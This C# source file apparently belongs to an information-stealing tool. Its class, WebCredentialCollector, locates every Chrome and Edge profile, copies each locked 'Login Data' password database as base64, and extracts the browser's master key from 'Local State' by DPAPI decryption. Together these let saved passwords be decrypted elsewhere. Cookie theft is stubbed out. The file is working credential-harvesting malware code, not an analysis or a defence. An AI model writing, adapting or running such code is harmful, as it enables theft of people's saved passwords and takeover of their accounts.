using System.Text.Json;
using Utils.UserUtils;

namespace WebInfoGather
{
	public class WebCredentialCollector
	{
		public enum CollectionType
		{
			Passwords = 0,
			Cookies = 1
		}

		private static readonly string[] SupportedBrowsers = { "Chrome", "Edge" };

		public static Dictionary<string, object> GatherLoginData(CollectionType collectionType)
		{
			var result = new Dictionary<string, object>();
			string homePath = GlobalUserUtils.HomePath();

			foreach (string browser in SupportedBrowsers)
			{
				switch (collectionType)
				{
					case CollectionType.Passwords:
						result[browser] = GatherBrowserLoginDataAsBase64(browser, homePath);
						break;

					case CollectionType.Cookies:
						result[browser] = "Cookie logic not implemented.";
						break;

					default:
						result[browser] = "Unknown collection type.";
						break;
				}
			}
			return result;
		}

		/// <summary>
		/// Gathers the entire "Login Data" file for each profile as base64, 
		/// plus reads "Local State" to retrieve the encrypted key (if present).
		/// </summary>
		private static Dictionary<string, object> GatherBrowserLoginDataAsBase64(string browser, string homePath)
		{
			var browserResult = new Dictionary<string, object>();

			// 1. Read Local State file to get the "encrypted_key" if desired
			string localStatePath = GetLocalStatePath(browser, homePath);
			if (File.Exists(localStatePath))
			{
				browserResult["encrypted_key"] = ReadEncryptedKeyFromLocalState(localStatePath);
			}
			else
			{
				browserResult["encrypted_key"] = "Local State not found.";
			}

			// 2. Find all profile folders for this browser (Default, Profile 1, etc.)
			var profiles = GetBrowserProfiles(browser, homePath);
			var profileData = new List<Dictionary<string, string>>();

			// 3. For each profile, read "Login Data" as base64
			foreach (var profileDir in profiles)
			{
				string loginDataPath = Path.Combine(profileDir, "Login Data");

				var singleProfile = new Dictionary<string, string>
				{
					["profile"] = Path.GetFileName(profileDir) // e.g. "Default" or "Profile 1"
				};

				if (File.Exists(loginDataPath))
				{
					// Attempt to open the locked file with FileShare.ReadWrite
					try
					{
						using (FileStream fs = new FileStream(
							loginDataPath,
							FileMode.Open,
							FileAccess.Read,
							FileShare.ReadWrite))
						{
							using (var ms = new MemoryStream())
							{
								fs.CopyTo(ms);
								byte[] fileBytes = ms.ToArray();
								singleProfile["login_data_base64"] = Convert.ToBase64String(fileBytes);
							}
						}
					}
					catch (Exception ex)
					{
						singleProfile["error"] = $"Failed to open with shared read: {ex.Message}";
					}

				}
				else
				{
					singleProfile["error"] = "Login Data file does not exist.";
				}

				profileData.Add(singleProfile);
			}

			browserResult["profiles"] = profileData;
			return browserResult;
		}

		private static string GetLocalStatePath(string browser, string homePath)
		{
			if (browser.Equals("chrome", StringComparison.OrdinalIgnoreCase))
			{
				return Path.Combine(homePath, "AppData", "Local", "Google", "Chrome", "User Data", "Local State");
			}
			else if (browser.Equals("edge", StringComparison.OrdinalIgnoreCase))
			{
				return Path.Combine(homePath, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State");
			}

			return string.Empty;
		}

		private static string ReadEncryptedKeyFromLocalState(string localStatePath)
		{
			try
			{
				string jsonContent = File.ReadAllText(localStatePath);
				using (JsonDocument doc = JsonDocument.Parse(jsonContent))
				{
					if (doc.RootElement.TryGetProperty("os_crypt", out JsonElement osCrypt))
					{
						if (osCrypt.TryGetProperty("encrypted_key", out JsonElement keyElement))
						{
							if (keyElement.ValueKind == JsonValueKind.String)
							{
								string key =  keyElement.GetString() ?? "";
								return NativeMthods.CryptographyHelper.DpapiUnprotectBase64Wrapper(key, NativeMthods.CryptographyHelper.CRYPTPROTECT_LOCAL_MACHINE);
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				return $"Error reading Local State: {ex.Message}";
			}
			return string.Empty;
		}


		private static IEnumerable<string> GetBrowserProfiles(string browser, string homePath)
		{
			string userDataPath = string.Empty;
			if (browser.Equals("chrome", StringComparison.OrdinalIgnoreCase))
			{
				userDataPath = Path.Combine(homePath, "AppData", "Local", "Google", "Chrome", "User Data");
			}
			else if (browser.Equals("edge", StringComparison.OrdinalIgnoreCase))
			{
				userDataPath = Path.Combine(homePath, "AppData", "Local", "Microsoft", "Edge", "User Data");
			}

			var foundProfiles = new List<string>();
			if (!Directory.Exists(userDataPath))
			{
				return foundProfiles;
			}

			try
			{
				var profileDirs = Directory.GetDirectories(userDataPath, "Profile*");
				if (profileDirs?.Length > 0)
				{
					foundProfiles.AddRange(profileDirs);
				}
				string defaultProfile = Path.Combine(userDataPath, "Default");
				if (Directory.Exists(defaultProfile))
				{
					foundProfiles.Add(defaultProfile);
				}
			}
			catch 
			{
				// Could log or handle as needed
			}

			return foundProfiles;
		}
	}
}
